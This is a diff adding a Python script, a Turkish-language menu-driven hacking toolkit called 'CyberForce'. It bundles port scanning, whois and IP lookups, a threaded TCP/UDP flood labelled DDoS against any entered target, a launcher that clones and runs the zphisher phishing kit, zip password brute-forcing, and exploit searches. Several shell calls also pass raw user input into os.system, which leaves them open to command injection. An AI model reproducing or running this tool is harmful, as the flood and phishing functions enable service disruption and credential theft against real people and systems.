@@ -1,0 +1,193 @@
+import os
+import socket
+import time
+import requests
+import threading
+import random
+import shutil
+import subprocess
+
+def banner():
+    os.system("clear" if os.name == "posix" else "cls")
+    print("\033[1;32m")
+    print(r"""
+  ██████╗ ██╗   ██╗██████╗ ███████╗███████╗███████╗
+  ██╔══██╗██║   ██║██╔══██╗██╔════╝██╔════╝██╔════╝
+  ██████╔╝██║   ██║██║  ██║█████╗  ███████╗█████╗  
+  ██╔═══╝ ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══╝  
+  ██║     ╚██████╔╝██████╔╝███████╗███████║███████╗
+  ╚═╝      ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝
+         CyberForce v1.0 - By Muhammet Emin
+    """)
+    print("\033[0m")
+
+def check_and_install(tool_name, install_cmd, check_path=None):
+    if check_path:
+        if os.path.exists(check_path):
+            print(f"{tool_name} zaten mevcut.")
+            return True
+    else:
+        if shutil.which(tool_name):
+            print(f"{tool_name} zaten sistemde yüklü.")
+            return True
+
+    print(f"{tool_name} bulunamadı. Yükleniyor...")
+    os.system(install_cmd)
+
+    if check_path:
+        if os.path.exists(check_path):
+            print(f"{tool_name} başarıyla yüklendi.")
+            return True
+    else:
+        if shutil.which(tool_name):
+            print(f"{tool_name} başarıyla yüklendi.")
+            return True
+
+    print(f"{tool_name} yüklenemedi. Lütfen manuel yükleyin.")
+    return False
+
+def setup_tools():
+    print("\nGerekli araçlar kontrol ediliyor ve yükleniyor...\n")
+    check_and_install("nmap", "apt-get install nmap -y")
+    check_and_install("whois", "apt-get install whois -y")
+    check_and_install("fcrackzip", "apt-get install fcrackzip -y")
+    check_and_install("searchsploit", "apt-get install exploitdb -y")
+
+    # Zphisher için klasör kontrol ve git clone
+    if not os.path.exists("zphisher"):
+        print("Zphisher bulunamadı. İndiriliyor...")
+        os.system("git clone https://github.com/htr-tech/zphisher.git")
+    else:
+        print("Zphisher zaten mevcut.")
+
+def port_taramasi():
+    hedef_ip = input("Hedef IP adresini girin: ")
+    try:
+        print(f"\n{hedef_ip} IP'si taranıyor...\n")
+        for port in range(1, 100):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.5)
+            sonuc = s.connect_ex((hedef_ip, port))
+            if sonuc == 0:
+                print(f"[+] Port {port} AÇIK")
+            s.close()
+    except Exception as e:
+        print(f"Hata oluştu: {e}")
+
+def whois_sorgusu():
+    domain = input("Domain girin (örnek: google.com): ")
+    os.system(f"whois {domain}")
+
+def ip_info():
+    hedef = input("IP adresi veya domain girin: ")
+    try:
+        url = f"http://ip-api.com/json/{hedef}"
+        response = requests.get(url).json()
+
+        print("\n\033[1;36m[IP BİLGİSİ]\033[0m")
+        print(f"IP: {response.get('query', 'Bilinmiyor')}")
+        print(f"Ülke: {response.get('country', 'Bilinmiyor')}")
+        print(f"Bölge: {response.get('regionName', 'Bilinmiyor')}")
+        print(f"Şehir: {response.get('city', 'Bilinmiyor')}")
+        print(f"ISP: {response.get('isp', 'Bilinmiyor')}")
+        print(f"Organizasyon: {response.get('org', 'Bilinmiyor')}")
+        print(f"Konum: {response.get('lat', 'Bilinmiyor')}, {response.get('lon', 'Bilinmiyor')}")
+    except:
+        print("Hata oluştu, geçerli bir IP/domain girildiğinden emin olun.")
+
+def ddos_saldiri():
+    hedef_ip = input("Hedef IP: ")
+    hedef_port = int(input("Hedef Port: "))
+    tur = input("Tür (TCP/UDP): ").upper()
+
+    def udp_flood():
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes_data = random._urandom(1024)
+        while True:
+            sock.sendto(bytes_data, (hedef_ip, hedef_port))
+
+    def tcp_flood():
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((hedef_ip, hedef_port))
+                s.send(random._urandom(1024))
+                s.close()
+            except:
+                pass
+
+    print("DDOS saldırısı başlatılıyor. Durdurmak için CTRL+C kullanın.")
+    for i in range(100):
+        if tur == "UDP":
+            t = threading.Thread(target=udp_flood)
+            t.daemon = True
+            t.start()
+        else:
+            t = threading.Thread(target=tcp_flood)
+            t.daemon = True
+            t.start()
+
+    while True:
+        time.sleep(1)
+
+def zafiyet_tarama():
+    hedef = input("Hedef IP veya domain: ")
+    print("Nmap ile taranıyor... (nmap -v -A)")
+    os.system(f"nmap -v -A {hedef}")
+
+def phishing_menu():
+    if os.path.exists("zphisher"):
+        print("ZPhisher başlatılıyor...")
+        os.system("bash zphisher/zphisher.sh")
+    else:
+        print("ZPhisher yüklü değil veya 'zphisher' klasörü bulunamadı.")
+
+def brute_force():
+    zip_dosya = input("Zip dosya yolu: ")
+    wordlist = input("Wordlist (şifre listesi) yolu: ")
+    os.system(f"fcrackzip -v -u -D -p {wordlist} {zip_dosya}")
+
+def exploit_araci():
+    arama = input("Exploit araması yap (örn: vsftpd): ")
+    os.system(f"searchsploit {arama}")
+
+def menu():
+    while True:
+        print("\n\033[1;34m[1] Port Taraması")
+        print("[2] Whois Sorgusu")
+        print("[3] IP Bilgisi")
+        print("[4] DDoS Saldırı")
+        print("[5] Zafiyet Taraması")
+        print("[6] Phishing Aracı")
+        print("[7] Password Bruteforce")
+        print("[8] Exploit Aracı")
+        print("[9] Çıkış\033[0m")
+        secim = input("Seçimin: ")
+
+        if secim == "1":
+            port_taramasi()
+        elif secim == "2":
+            whois_sorgusu()
+        elif secim == "3":
+            ip_info()
+        elif secim == "4":
+            ddos_saldiri()
+        elif secim == "5":
+            zafiyet_tarama()
+        elif secim == "6":
+            phishing_menu()
+        elif secim == "7":
+            brute_force()
+        elif secim == "8":
+            exploit_araci()
+        elif secim == "9":
+            print("Çıkılıyor...")
+            time.sleep(1)
+            break
+        else:
+            print("Geçersiz seçim.")
+
+if __name__ == "__main__":
+    setup_tools()
+    banner()
+    menu()
